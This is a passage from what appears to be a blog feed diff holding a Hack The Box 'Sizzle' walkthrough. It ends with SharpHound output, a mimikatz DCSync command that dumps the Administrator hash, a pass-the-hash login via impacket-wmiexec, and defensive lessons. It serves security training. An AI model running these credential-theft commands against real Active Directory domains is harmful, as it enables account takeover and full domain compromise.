class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/s&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RAM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;24.6732476&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Consumers&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;closing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;24.7044981&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;closed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waiting&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Closing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;writers&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;24.8763726&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Status:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.043478&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/s&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RAM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;24.8763726&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enumeration&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;00:00:46.3154306&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;24.9544990&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Saving&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stats:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mappings.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
- &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mappings.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
- &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;machine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mappings.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
- &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mappings.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
- &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;global&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;catalog&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mappings.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2026&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-06-17T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;24.9701228&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharpHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enumeration&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Completed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8:39&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;6/17/2026&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Happy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Graphing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCSync&lt;/code&gt; the DC:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/sizzle-5.png&quot; alt=&quot;sizzle-5.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-4-privilege-escalation-mrlky---administrator&quot;&gt;📈 4. Privilege Escalation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;)&lt;/h2&gt;
-
-&lt;p&gt;In order to perform the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCSync&lt;/code&gt; attack, we need to upload an obfuscated version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mimikatz.exe&lt;/code&gt; to execute the following:&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mimikatz.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lsadump::dcsync&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/user:administrator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/domain:htb.local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/dc:sizzle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Which will provide us Administrator’s RC4 hash: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f6b7160bfc91823792e0ac3a162c9267&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;impacket-wmiexec administrator@sizzle.htb &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :f6b7160bfc91823792e0ac3a162c9267
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SMBv3.0 dialect used
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Launching semi-interactive shell - Careful what you execute
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
-C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;htb&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-learnings&quot;&gt;🧠 Learnings&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;Lock Down Share Permissions:&lt;/strong&gt; Writable public or archive SMB shares are an immediate liability. Attackers can upload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.scf&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.url&lt;/code&gt; files to blindly harvest NTLMv2 hashes from any user or automated script browsing the folder.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Inspect 401 WinRM Failures:&lt;/strong&gt; If valid credentials fail to authenticate over WinRM, check for active certificate-based authentication requirements. Look for exposed ADCS web templates to issue valid session certs.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Watch Out for Browser Session Poisoning:&lt;/strong&gt; When using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt; to issue certificates for a newly compromised user, always use an incognito window. Otherwise, the browser may reuse authentication cookies from your previous user session.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Audit Domain Replication Rights:&lt;/strong&gt; Regularly review BloodHound for accounts holding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetChanges&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetChangesAll&lt;/code&gt; rights. Any account with these privileges can mimic a Domain Controller and steal the entire active directory credential database.&lt;/li&gt;
-&lt;/ul&gt;
 </content>
   </entry>
   
